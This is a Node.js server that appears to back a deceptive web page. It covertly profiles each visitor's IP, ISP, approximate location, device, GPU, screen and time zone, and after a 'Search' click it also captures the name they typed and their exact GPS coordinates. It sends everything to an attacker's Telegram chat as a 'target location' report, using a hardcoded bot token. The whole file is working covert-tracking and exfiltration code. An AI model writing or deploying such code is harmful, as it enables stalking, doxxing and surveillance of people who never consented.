const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

let activeProfileCache = {};

function sendTelegramMessage(text) {
    const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" });
    const options = {
        hostname: 'api.telegram.org', port: 443, path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, () => {});
    req.write(data); req.end();
}

function queryNetworkDetails(ip, callback) {
    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.')) {
        return callback({
            status: "success", city: "Local Dev Machine", regionName: "Local Network Line",
            country: "Local Host Environment", isp: "Internal Loopback Route Proxy", mobile: false, proxy: false
        });
    }
    const endpoint = `https://ip-api.com{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,mobile,proxy`;
    https.get(endpoint, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try { callback(JSON.parse(data)); } catch (e) { callback(null); }
        });
    }).on('error', () => callback(null));
}

const server = http.createServer((req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent.toLowerCase().includes('uptimerobot') || req.url === '/favicon.ico') {
        res.writeHead(200, { 'Content-Type': 'image/x-icon' }); res.end(); return;
    }

    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const cleanIp = rawIp.split(',')[0].trim();

    if (req.method === 'GET' && req.url === '/') {
        const timestamp = new Date().toLocaleString();
        let osPlatform = "Desktop Computer / Laptop OS";
        if (/iPhone/i.test(userAgent)) osPlatform = "Apple iPhone iOS";
        else if (/iPad/i.test(userAgent)) osPlatform = "Apple iPad iOS";
        else if (/Android/i.test(userAgent)) osPlatform = "Android Mobile Device";
        else if (/Macintosh/i.test(userAgent)) osPlatform = "Apple Mac Computer Profile";

        queryNetworkDetails(cleanIp, (net) => {
            activeProfileCache[cleanIp] = {
                timestamp, osPlatform, ip: cleanIp,
                isp: net && net.status === 'success' ? net.isp : "Private Provider Profile",
                city: net && net.status === 'success' ? net.city : "Unknown",
                region: net && net.status === 'success' ? net.regionName : "Unknown",
                country: net && net.status === 'success' ? net.country : "Unknown",
                zip: net && net.status === 'success' ? net.zip : "N/A",
                netType: net && net.mobile ? "📶 Mobile Data (3G/4G/5G Network)" : "🌐 Broadband / Wi-Fi Network Connection",
                shield: net && net.proxy ? "⚠️ VPN / Proxy Shield Active" : "🔒 Direct Unproxied Pipeline",
                ispMap: net && net.lat ? `https://google.com{net.lat},${net.lon}` : null,
                specs: null,
                action: null,
                sent: false
            };

            // Safety timeout: Fallback logger fires profile state if user lags inside interaction workflows
            setTimeout(() => { dispatchIntegratedReport(cleanIp); }, 8000);
        });

        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content);
        });
    } 
    else if (req.method === 'POST' && req.url === '/specs-sync') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            if (activeProfileCache[cleanIp]) {
                try { activeProfileCache[cleanIp].specs = JSON.parse(body); } catch(e){}
            }
            res.writeHead(200); res.end();
        });
    }
    else if (req.method === 'POST' && req.url === '/action-sync') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            if (activeProfileCache[cleanIp]) {
                try { 
                    activeProfileCache[cleanIp].action = JSON.parse(body); 
                    dispatchIntegratedReport(cleanIp); // Fire immediately upon click action completion
                } catch(e){}
            }
            res.writeHead(200); res.end();
        });
    }
});

function dispatchIntegratedReport(ip) {
    const profile = activeProfileCache[ip];
    if (!profile || profile.sent) return;
    
    // Guard parameter: wait for the click input action payload unless timeout lifecycle ends it
    if (!profile.action && (new Date() - new Date(profile.timestamp) < 7000)) return;
    profile.sent = true;

    const sp = profile.specs;
    const ac = profile.action;

    const screen = sp ? `${sp.width}x${sp.height} (@${sp.pixelRatio}x)` : "Not Reported";
    const gpu = sp ? sp.gpu : "Not Reported";
    const cores = sp ? `${sp.cores} Core CPU` : "Not Reported";
    const zone = sp ? sp.timezone : "Not Reported";

    let payloadSummary = `🗂️ *Integrated Portal Session Report*\n\n` +
                         `📶 *Public External IP:* \`${profile.ip}\`\n` +
                         `🏢 *Internet Provider (ISP):* ${profile.isp}\n` +
                         `📡 *Connection Mode:* ${profile.netType}\n` +
                         `🌍 *ISP Route Area:* ${profile.city}, ${profile.region}, ${profile.country}\n\n` +
                         `📱 *Device Structure:* ${profile.osPlatform}\n` +
                         `⚙️ *Internal Cores:* ${cores}\n` +
                         `🎮 *Graphics Processing (GPU):* \`${gpu}\`\n` +
                         `🖥️ *Screen Layout:* ${screen}\n` +
                         `⏰ *Device Time Zone:* ${zone}\n\n`;

    if (ac) {
        const accurateGpsLink = `https://google.com{ac.lat},${ac.lon}`;
        payloadSummary += `🎯 *User Action Verified Check-In*\n` +
                          `👤 *Provided Name Input:* \`${ac.fullName.toUpperCase()}\`\n` +
                          `📍 *Verified Hardware GPS Coords:* ${ac.lat}, ${ac.lon}\n` +
                          `🗺️ [Open Exact Real-Time GPS Target Location](${accurateGpsLink})\n\n`;
    } else {
        payloadSummary += `⚠️ *Action Warning:* User closed or left the site without clicking 'Search'.\n`;
        if (profile.ispMap) { payloadSummary += `🗺️ [Open Estimated ISP Hub Area](${profile.ispMap})\n\n`; }
    }

    payloadSummary += `⏱️ *Registered Timestamp:* ${profile.timestamp}`;
    sendTelegramMessage(payloadSummary);
    delete activeProfileCache[ip];
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {});
